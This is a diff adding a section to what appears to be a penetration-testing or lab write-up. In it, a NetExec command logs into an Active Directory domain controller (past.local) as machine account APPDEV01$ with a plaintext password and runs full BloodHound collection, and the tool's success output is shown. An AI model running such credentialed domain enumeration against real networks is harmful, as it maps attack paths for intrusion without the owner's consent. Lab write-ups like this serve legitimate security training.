@@ -214,3 +214,14 @@ I also checked his access on shares and has no interesting permissions there!
 
 # Bloodhound
 
+```python
+nxc ldap EC2AMAZ-A5O4OL8.past.local -u 'APPDEV01$' -p 'P@ssw0rd!' --dns-server 10.0.16.121 --bloodhound -c All
+LDAP        10.0.16.121     389    EC2AMAZ-A5O4OL8  [*] Windows 10 / Server 2016 Build 14393 (name:EC2AMAZ-A5O4OL8) (domain:past.local) (signing:None) (channel binding:No TLS cert) 
+LDAP        10.0.16.121     389    EC2AMAZ-A5O4OL8  [+] past.local\APPDEV01$:P@ssw0rd! 
+LDAP        10.0.16.121     389    EC2AMAZ-A5O4OL8  Resolved collection methods: container, psremote, trusts, dcom, group, rdp, session, objectprops, localadmin, acl
+LDAP        10.0.16.121     389    EC2AMAZ-A5O4OL8  Done in 0M 19S
+LDAP        10.0.16.121     389    EC2AMAZ-A5O4OL8  Compressing output into /home/kali/.nxc/logs/EC2AMAZ-A5O4OL8_10.0.16.121_2026-07-27_173800_bloodhound.zip
+```
+
+Ive collected the loot!
+
